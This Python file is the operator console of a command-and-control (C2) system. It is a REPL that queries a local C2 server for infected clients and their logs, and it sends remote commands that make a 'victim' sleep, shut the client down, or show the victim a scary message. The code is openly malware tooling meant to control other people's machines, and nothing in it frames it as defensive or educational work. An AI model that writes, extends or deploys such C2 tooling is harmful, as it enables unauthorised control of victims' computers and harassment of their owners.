from typing import Optional
import os
import requests
import re

PLAIN_HEADER = {'Content-Type': 'text/plain'}
CMD_SYN_ERR  = 'Invalid command, please use \'help\' to refer to commands.'
LOGS_SYN_ERR = 'Invalid logs syntax, needs one arg <client_id>'
SLP_SYN_ERR  = 'Invalid slp syntax, needs two args <client_id> & <n>'
SHD_SYN_ERR  = 'Invalid shd syntax, requires one arg <client_id>'
PWN_SYN_ERR  = 'Invalid pwn syntax, requires one arg <client_id>'

global exit

def run():
    ''' effectively run a simple repl, break once the user enters 'exit'
    otheriwse handle the command provided by the user
    '''
    print_home()
    global exit

    exit = False
    while True:
        cmd = input('> ').strip()        
        handle_command(cmd)

        if exit: 
            break

def text_from_response(response) -> str:
    return f'RET CODE |{response.status_code}|\n\n{response.content.decode()}\n'

def handle_command(full_cmd):
    ''' Extract all the arguments of the command, if the cmd length is 1 then its 

    '''
    arr = re.sub(pattern='\s+', repl=' ', string=full_cmd.strip()).split(' ')
    if len(arr) < 1 or len(arr) > 3:
        print(CMD_SYN_ERR)
        return

    is_valid, err_msg = validate_command(arr[0], len(arr))
    if not is_valid:
        print(err_msg)
        return
    
    # handle commands with one token
    if len(arr) == 1:
        handle_helper_cmds(arr[0])
        return

    cmd = arr[0]
    client_id = arr[1]
    match cmd.lower():
        case 'logs':
            response = requests.get(f'http://127.0.0.1:5000/logs/{client_id}')
            print(text_from_response(response))
            return
        case 'slp': cmd = f'{cmd} {arr[2]}'
        case 'shd': pass
        case 'pwn': pass

    response = requests.post(f'http://127.0.0.1:5000/commands/{client_id}', data=cmd, headers=PLAIN_HEADER)
    print(text_from_response(response))


def handle_helper_cmds(cmd):
    ' Handle the helper controller-side commands. Returns true if the command was exit! '
    global exit
    match cmd:
        case 'exit': exit = True
        case 'help': print_home()
        case 'clear': os.system('cls')
        case 'clients':
            response = requests.get(f'http://127.0.0.1:5000/clients')
            print(text_from_response(response))


def validate_command(cmd: str, num_args: int) -> tuple[bool, str]:
    match cmd:
        case 'help':    return (num_args == 1, CMD_SYN_ERR)
        case 'exit':    return (num_args == 1, CMD_SYN_ERR)
        case 'clear':   return (num_args == 1, CMD_SYN_ERR)
        case 'clients': return (num_args == 1, CMD_SYN_ERR)
        case 'logs':    return (num_args == 2, LOGS_SYN_ERR)
        case 'slp':     return (num_args == 3, SLP_SYN_ERR)
        case 'shd':     return (num_args == 2, SHD_SYN_ERR)
        case 'pwn':     return (num_args == 2, PWN_SYN_ERR)
        case _:         return (False, CMD_SYN_ERR)


def print_home():
    print('''
           ________________________________
         /                                  \\
        {   Welcome To Your C2 Controller!   }
         \\ ________________________________ /

    Commands to retrieve information:
      1) clients
          - Performs GET /clients to retrieve client id list.
      2) logs <client_id>
          - Performs GET /logs/<client_id> to retrieve logs for a specific client.

    List of remote commands:
      1) slp <client_id> <num_of_seconds>
          - Make the victim sleep for n seconds.
          - n must be >= 0
      2) shd <client_id>
          - Terminate execution of client program.
      3) pwn <client_id>
          - Display a simple messsage to the victim to scare them.

    Local commands:
      1) 'help' to display this page again!
      2) 'clear' to clear the terminal window.
      3) 'exit' to close current session.
    ''')


if __name__ == '__main__':
    run()